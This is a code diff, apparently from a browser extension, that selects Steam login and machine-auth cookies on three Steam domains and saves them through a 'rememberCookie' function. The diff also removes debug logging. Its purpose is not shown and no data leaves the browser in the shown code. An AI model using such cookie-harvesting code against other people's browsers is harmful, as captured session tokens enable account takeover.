@@ -1,11 +1,11 @@
-var domains = ["*://steamcommunity.com/*", "*://store.steampowered.com/*", "*://help.steampowered.com/*"]
+var domains = ["steamcommunity.com", "store.steampowered.com", "help.steampowered.com"]
 
 function onError(error){
     console.log(error)
 }
 
 function isCookieInteresting(cookie){
-    return cookie.name === "steamLoginSecure" || cookie.name.includes("steamMachineAuth")
+    return cookie.name === "steamRememberLogin" || cookie.name.includes("steamMachineAuth")
 }
 
 function rememberCookie(cookie){
@@ -14,22 +14,17 @@ function rememberCookie(cookie){
 }
 
 function saveAllTheInterestingCookies(cookieList){
-    console.log("Looking for interesting cookies in '" + cookieList + "'");
     for(let cookie of cookieList){
-        console.log("What is this?:'" + cookie + "'");
-        console.log("Domain:'" + cookie.domain + "'");
         if(isCookieInteresting(cookie)){
             console.log("Interesting cookie found:'" + cookie.name + "'");
             rememberCookie(cookie)
-        } else {
-            console.log("Not interesting cookie:'" + cookie.name + "'");
         }
     }
 }
 
 function saveCookiesForDomain(domain){
     console.log("For domain:'" + domain + "'");
-    var promiseOfCookies = browser.cookies.getAll({});
+    var promiseOfCookies = browser.cookies.getAll({domain: domain});
     promiseOfCookies.then(saveAllTheInterestingCookies);
 }
 
